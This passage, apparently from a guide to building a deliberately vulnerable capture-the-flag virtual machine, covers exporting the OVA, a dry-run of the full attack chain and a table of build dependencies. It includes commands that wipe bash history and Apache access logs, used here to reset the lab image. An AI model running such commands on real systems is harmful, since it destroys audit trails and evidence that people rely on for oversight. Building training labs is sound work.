Export the VM as an OVA for distribution. Before export, clear bash history on all accounts (`history -c && history -w` as each user, and `cat /dev/null > /root/.bash_history`), and clear Apache access logs (`> /var/log/apache2/access.log`) so students start from a clean slate.

**Verification checkpoint (full dry-run):** Import the OVA on a clean machine. Complete the entire attack chain from scratch — nmap through root flag — using only the student brief. Time yourself. A well-calibrated medium box should take 60–120 minutes for an intermediate student.

---

### Dependency order summary

|Part|Depends on|
|---|---|
|1 — Base OS|Nothing|
|2 — Vulnerable plugin|Part 1 complete|
|3 — Credential chain|Part 1 complete, MySQL running|
|4 — Cron privesc|Parts 1 and 3 (developer account must exist)|
|5 — Enumeration tuning|Part 2 complete|
|6 — Flags|Parts 2, 3, 4 complete|
|7 — Packaging|All parts complete|

Parts 2, 3, and 4 can be done in parallel once Part 1 is done. Part 5 is a tuning pass on top of Part 2. Flags go in last, packaging goes last of all.



